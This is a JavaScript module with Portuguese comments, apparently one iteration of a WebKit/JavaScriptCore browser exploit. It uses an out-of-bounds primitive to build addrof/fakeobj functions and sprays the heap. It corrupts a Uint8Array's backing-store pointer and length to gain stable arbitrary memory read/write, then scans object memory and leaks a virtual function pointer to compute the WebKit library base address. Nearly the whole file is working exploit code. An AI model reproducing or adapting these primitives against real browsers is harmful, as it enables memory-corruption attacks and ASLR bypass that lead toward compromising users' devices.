// js/script3/testArrayBufferVictimCrash.mjs (v119 - R79 Correção de Escopo de Variáveis)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// - Ajusta o escopo das variáveis chave (leak_target_obj, leak_target_addr) para que
//   elas sejam acessíveis por todas as fases relevantes dentro do bloco 'try'.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute, 
    oob_write_absolute 
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// Nome do módulo atualizado para refletir a nova tentativa de correção
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v119_R79_ScopeFix";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Corrupção de Backing Store (Escopo Corrigido) ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou.",
        webkit_base_addr: null
    };

    // Primitivas de addrof/fakeobj (para a Fase 4 e obter endereços na Fase 5)
    let confused_array;
    let victim_array;
    let addrof_func;
    let fakeobj_func; 

    // A primitiva arbitrária real será baseada no Uint8Array corruptível
    let arb_rw_array = null; 

    // As funções de leitura/escrita arbitrária para a Fase 5 e em diante
    let arb_read_stable = null;
    let arb_write_stable = null;

    // Variáveis com escopo ajustado para serem acessíveis em toda a função
    let leak_target_obj = null;
    let leak_target_addr = null;

    try {
        // Helper para definir as primitivas de addrof/fakeobj (para obtenção de endereços)
        const setupAddrofFakeobj = () => {
            confused_array = [13.37]; 
            victim_array = [{ dummy: 0 }]; 
            
            addrof_func = (obj) => {
                victim_array[0] = obj;
                return doubleToInt64(confused_array[0]);
            };
            fakeobj_func = (addr) => { 
                confused_array[0] = int64ToDouble(addr);
                return victim_array[0];
            };
        };


        // --- FASES 1-3: Configuração das Primitivas INICIAL (para verificação) ---
        logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E (primeira vez para verificação)... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");

        setupAddrofFakeobj(); 
        
        let leaker_phase4 = { obj_prop: null, val_prop: 0 };
        const arb_read_phase4 = (addr, size_bytes = 8) => { 
            leaker_phase4.obj_prop = fakeobj_func(addr);
            const result_64 = doubleToInt64(leaker_phase4.val_prop);
            return (size_bytes === 4) ? result_64.low() : result_64;
        };
        const arb_write_phase4 = (addr, value, size_bytes = 8) => { 
            leaker_phase4.obj_prop = fakeobj_func(addr);
            if (size_bytes === 4) {
                leaker_phase4.val_prop = Number(value) & 0xFFFFFFFF; 
            } else {
                leaker_phase4.val_prop = int64ToDouble(value);
            }
        };
        logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida estão prontas para verificação.", "good");

        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E (com spray)... ---", "subtest");
        const spray_phase4 = [];
        for (let i = 0; i < 1000; i++) {
            spray_phase4.push({ a: i, b: 0xCAFEBABE, c: i*2, d: i*3 }); 
        }
        const test_obj_phase4 = spray_phase4[500]; 
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        const test_obj_addr_phase4 = addrof_func(test_obj_phase4);
        const value_to_write_phase4 = new AdvancedInt64(0x12345678, 0xABCDEF01);
        const prop_a_addr_phase4 = test_obj_addr_phase4.add(0x10); 

        logS3(`(Verificação Fase 4) Escrevendo ${value_to_write_phase4.toString(true)} no endereço ${prop_a_addr_phase4.toString(true)}...`, "info");
        arb_write_phase4(prop_a_addr_phase4, value_to_write_phase4);

        const value_read_phase4 = arb_read_phase4(prop_a_addr_phase4);
        logS3(`(Verificação Fase 4) Valor lido de volta: ${value_read_phase4.toString(true)}`, "leak");

        if (!value_read_phase4.equals(value_to_write_phase4)) {
            throw new Error(`A verificação de L/E da Fase 4 falhou. Escrito: ${value_to_write_phase4.toString(true)}, Lido: ${value_read_phase4.toString(true)}`);
        }
        logS3("VERIFICAÇÃO DE L/E DA FASE 4 COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");
        await PAUSE_S3(50); 

        // --- Reiniciar TODO o ambiente para a Fase 5 ---
        logS3("--- PREPARANDO FASE 5: RE-INICIALIZANDO TODO O AMBIENTE OOB E PRIMITIVAS... ---", "critical");
        
        confused_array = null;
        victim_array = null;
        addrof_func = null;
        fakeobj_func = null; 
        leaker_phase4 = null; 
        arb_rw_array = null; 

        await PAUSE_S3(200); 

        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Falha ao re-inicializar primitiva OOB para Fase 5.");
        logS3("Ambiente OOB re-inicializado com sucesso.", "good");

        setupAddrofFakeobj(); // Re-cria as primitivas addrof/fakeobj no novo contexto
        logS3("Primitivas Addrof/Fakeobj re-inicializadas para Fase 5.", "good");

        // --- Warm-up do addrof/fakeobj (no novo ambiente) ---
        logS3("--- Warm-up: Realizando operações de Addrof/Fakeobj de teste para estabilizar... ---", "info");
        const warm_up_obj = { w: 1 };
        addrof_func(warm_up_obj); 
        fakeobj_func(new AdvancedInt64(0x1000, 0)); 
        logS3("Warm-up Addrof/Fakeobj concluído.", "info");
        await PAUSE_S3(50); 

        // ============================================================================
        // NOVO: CONSTRUÇÃO DA PRIMITIVA DE LEITURA/ESCRITA ARBITRÁRIA ESTÁVEL (CORRUPÇÃO DE BACKING STORE)
        // ============================================================================
        logS3("--- FASE 5.1: Construindo Primitiva de L/E Estável (Corrupção de Backing Store) ---", "subtest");

        arb_rw_array = new Uint8Array(0x1000); 
        logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");

        // Agora, 'leak_target_obj' e 'leak_target_addr' são inicializados aqui, após o OOB re-trigger.
        leak_target_obj = { f: 0xDEADBEEF, g: 0xCAFEBABE, h: 0x11223344 }; 
        for(let i=0; i<1000; i++) { leak_target_obj[`p${i}`] = i; } 
        leak_target_addr = addrof_func(leak_target_obj); // Atribui à variável de escopo mais amplo
        logS3(`[Etapa 1] Endereço do objeto alvo (leak_target_obj): ${leak_target_addr.toString(true)}`, "info");
        
        await PAUSE_S3(250); // Pausa após obtenção do endereço

        const arb_rw_array_ab_view_addr = addrof_func(arb_rw_array);
        logS3(`    Endereço do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr.toString(true)}`, "leak");

        const oob_dv = getOOBDataView();
        if (!oob_dv) throw new Error("DataView OOB não está disponível após re-inicialização.");

        const arb_rw_array_m_vector_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
        const arb_rw_array_m_length_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET); 
        
        const original_m_vector = oob_read_absolute(arb_rw_array_m_vector_orig_ptr_addr, 8);
        const original_m_length = oob_read_absolute(arb_rw_array_m_length_orig_ptr_addr, 4);

        logS3(`    Original m_vector de arb_rw_array: ${original_m_vector.toString(true)}`, "info");
        logS3(`    Original m_length de arb_rw_array: ${toHex(original_m_length)}`, "info");

        arb_read_stable = (address, size_bytes) => {
            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, address, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); 

            let result;
            const dv = new DataView(arb_rw_array.buffer); 
            if (size_bytes === 1) result = arb_rw_array[0]; 
            else if (size_bytes === 2) result = dv.getUint16(0, true);
            else if (size_bytes === 4) result = dv.getUint32(0, true);
            else if (size_bytes === 8) result = doubleToInt64(dv.getFloat64(0, true));
            else throw new Error("Tamanho de leitura inválido para arb_read_stable.");

            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, original_m_vector, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, original_m_length, 4);
            return result;
        };

        arb_write_stable = (address, value, size_bytes) => {
            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, address, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); 

            const dv = new DataView(arb_rw_array.buffer); 
            if (size_bytes === 1) arb_rw_array[0] = value;
            else if (size_bytes === 2) dv.setUint16(0, value, true);
            else if (size_bytes === 4) dv.setUint32(0, value, true);
            else if (size_bytes === 8) dv.setFloat64(0, int64ToDouble(value), true);
            else throw new Error("Tamanho de escrita inválido para arb_write_stable.");

            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, original_m_vector, 8);
            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, original_m_length, 4);
        };
        logS3("Primitivas de L/E estáveis (arb_read_stable, arb_write_stable) construídas com sucesso.", "good");
        await PAUSE_S3(50);


        // ============================================================================
        // TESTE DE COERÊNCIA DE L/E NA FASE 5 (usando arb_write_stable)
        // ============================================================================
        logS3("--- TESTE DE COERÊNCIA (Fase 5): Escrita Arbitrária ESTÁVEL vs. Leitura JS Normal ---", "subtest");
        const coherence_test_val = 0xAAAAAAAA; 
        const prop_f_offset = 0x10; 
        const prop_f_addr = leak_target_addr.add(prop_f_offset); 

        logS3(`    (Coerência) Escrevendo 0x${coherence_test_val.toString(16)} em ${prop_f_addr.toString(true)} via arb_write_stable (4 bytes)...`, "info");
        arb_write_stable(prop_f_addr, coherence_test_val, 4); 

        await PAUSE_S3(10); 

        logS3(`    (Coerência) Lendo o valor de leak_target_obj.f via JavaScript normal...`, "info");
        const read_via_js_normal = leak_target_obj.f;
        logS3(`    (Coerência) Valor lido via JS normal: ${toHex(read_via_js_normal)}`, "leak");

        if (read_via_js_normal !== coherence_test_val) {
            throw new Error(`FALHA CRÍTICA (COERÊNCIA ESTÁVEL): Valor escrito via arb_write_stable (${toHex(coherence_test_val)}) NÃO corresponde ao lido via JS normal (${toHex(read_via_js_normal)}) em leak_target_obj.f. Isso indica que a corrupção do backing store não está funcionando como esperado.`);
        }
        logS3("--- TESTE DE COERÊNCIA (Fase 5): SUCESSO! arb_write_stable está escrevendo no local correto do objeto. ---", "good");
        await PAUSE_S3(50);


        // ============================================================================
        // SCANNER DE OFFSETS (agora usando arb_read_stable)
        // ============================================================================
        logS3("--- SCANNER DE OFFSETS: Varrendo a memória ao redor do objeto alvo (com arb_read_stable)... ---", "subtest");
        let found_structure_ptr = null;
        let found_structure_id = null;
        let found_vtable_ptr = null;

        const SCAN_RANGE_START = 0x0; 
        const SCAN_RANGE_END = 0x100; 
        const SCAN_STEP = 0x8;       

        for (let offset = SCAN_RANGE_START; offset < SCAN_RANGE_END; offset += SCAN_STEP) {
            const current_scan_addr = leak_target_addr.add(offset);
            
            let val_8_bytes = AdvancedInt64.Zero;
            try {
                val_8_bytes = arb_read_stable(current_scan_addr, 8); 
                logS3(`    [Scanner] Offset ${toHex(offset, 6)}: Lido QWORD ${val_8_bytes.toString(true)}`, "debug");

                if (!val_8_bytes.equals(AdvancedInt64.Zero) && 
                    (val_8_bytes.high() >>> 16) === 0x7FFF) { 
                    
                    logS3(`    [Scanner] Possível Ponteiro (Structure/Vtable?) em offset ${toHex(offset, 6)}: ${val_8_bytes.toString(true)}`, "leak");
                    
                    if (offset === JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET) {
                        found_structure_ptr = val_8_bytes;
                        logS3(`        [Scanner] --> CANDIDATO FORTE: Ponteiro da Structure em ${toHex(offset, 6)}!`, "good");
                    }
                    else if (offset === 0x0) { 
                        found_vtable_ptr = val_8_bytes;
                        logS3(`        [Scanner] --> CANDIDATO: Ponteiro de Vtable (do próprio objeto) em ${toHex(offset, 6)}!`, "good");
                    }
                }

                if (offset % 4 === 0) { 
                    const val_4_bytes = arb_read_stable(current_scan_addr, 4); 
                    if (val_4_bytes !== 0 && typeof val_4_bytes === 'number' && val_4_bytes < 0x10000) { 
                        logS3(`    [Scanner] Possível StructureID (Uint32) em offset ${toHex(offset, 6)}: ${toHex(val_4_bytes)} (decimal: ${val_4_bytes})`, "leak");
                        if (offset === JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET) {
                             found_structure_id = val_4_bytes;
                             logS3(`        [Scanner] --> CANDIDATO FORTE: StructureID em ${toHex(offset, 6)}!`, "good");
                        }
                    }
                }

            } catch (scan_e) {
                logS3(`    [Scanner] Erro lendo offset ${toHex(offset, 6)}: ${scan_e.message}`, "error");
            }
        }
        logS3("--- FIM DO SCANNER DE OFFSETS ---", "subtest");

        // Decisão com base no scanner
        let structure_addr = null;
        let actual_structure_id = null;

        if (found_structure_ptr && !found_structure_ptr.equals(AdvancedInt64.Zero)) {
            structure_addr = found_structure_ptr;
            logS3(`[DECISÃO] Usando Ponteiro de Structure encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)}: ${structure_addr.toString(true)}`, "info");
        } else if (typeof found_structure_id === 'number' && found_structure_id !== 0) {
            actual_structure_id = found_structure_id;
            logS3(`[DECISÃO] Usando StructureID encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET)}: ${toHex(actual_structure_id)}`, "info");
            
            final_result.message = `StructureID ${toHex(actual_structure_id)} encontrado. Precisamos do WebKit Base Address e da Structure Table Base para resolver o ponteiro da Structure.`;
            final_result.success = true; 
            final_result.webkit_leak_result = { success: false, msg: final_result.message, webkit_base_candidate: null };
            return final_result; 

        } else {
            throw new Error(`FALHA CRÍTICA: Scanner de offsets não encontrou Structure Pointer ou StructureID válidos no objeto alvo. Ultimo vazado leak_target_addr: ${leak_target_addr.toString(true)}`);
        }


        // Continua com a Fase 3 (leitura da vfunc::put) usando o structure_addr encontrado
        const vfunc_put_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
        const jsobject_put_addr = arb_read_stable(vfunc_put_ptr_addr, 8); 
        logS3(`[Etapa 3] Lendo do endereço ${vfunc_put_ptr_addr.toString(true)} (Structure REAL + 0x18) para obter o ponteiro da vfunc...`, "debug");
        logS3(`[Etapa 3] Endereço vazado da função (JSC::JSObject::put): ${jsobject_put_addr.toString(true)}`, "leak");
        if(jsobject_put_addr.low() === 0 && jsobject_put_addr.high() === 0) throw new Error("Ponteiro da função JSC::JSObject::put é NULO ou inválido.");
        if (!((jsobject_put_addr.high() >>> 16) === 0x7FFF || (jsobject_put_addr.high() === 0 && jsobject_put_addr.low() !== 0))) {
            logS3(`[Etapa 3] ALERTA: high part do JSObject::put Address inesperado: ${toHex(jsobject_put_addr.high())}`, "warn");
        }


        // 4. Calcular o endereço base da WebKit.
        const jsobject_put_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
        logS3(`[Etapa 4] Offset conhecido de JSC::JSObject::put: ${jsobject_put_offset.toString(true)}`, "info");

        const webkit_base_addr = jsobject_put_addr.sub(jsobject_put_offset);
        final_result.webkit_base_addr = webkit_base_addr.toString(true);

        logS3(`++++++++++++ SUCESSO! ENDEREÇO BASE DA WEBKIT CALCULADO ++++++++++++`, "vuln");
        logS3(`   ENDEREÇO BASE: ${final_result.webkit_base_addr}`, "vuln");

        final_result.success = true;
        final_result.message = `Vazamento da base da WebKit bem-sucedido. Base encontrada em: ${final_result.webkit_base_addr}.`;

    } catch (e) {
        final_result.success = false;
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    } finally {
        confused_array = null;
        victim_array = null;
        addrof_func = null;
        fakeobj_func = null;
        arb_rw_array = null; 
        arb_read_stable = null;
        arb_write_stable = null;
        
        logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: {
            success: !!final_result.webkit_base_addr,
            msg: final_result.message,
            webkit_base_candidate: final_result.webkit_base_addr
        },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Corrupção de Backing Store)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Backing Store Corruption)' }
    };
}
